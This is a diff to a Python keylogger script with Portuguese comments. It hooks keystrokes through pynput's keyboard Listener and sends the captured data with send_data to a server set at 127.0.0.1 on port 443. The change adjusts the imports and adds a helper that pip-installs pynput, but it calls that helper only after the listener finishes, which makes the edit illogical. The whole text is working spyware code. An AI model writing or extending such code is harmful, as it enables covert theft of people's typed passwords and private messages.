@@ -1,10 +1,18 @@
 import json
 import threading
 import requests
-
-from pynput import keyboard
+import pynput
 from pynput.keyboard import Key, KeyCode
+import subprocess
+import sys
 
+# Função para instalar pynput
+def install_pynput():
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
+
+# Instruções para instalação do pynput
+# Para instalar o pynput, execute:
+# pip install pynput
 
 server_ip = '127.0.0.1'
 server_port = 443
@@ -87,6 +95,9 @@ def send_data():
         print(e)
     
     
-with keyboard.Listener(on_press=process_keypress) as listener:
+with pynput.keyboard.Listener(on_press=process_keypress) as listener:
     send_data()
     listener.join()
+
+# Chama a função para instalar pynput
+install_pynput()
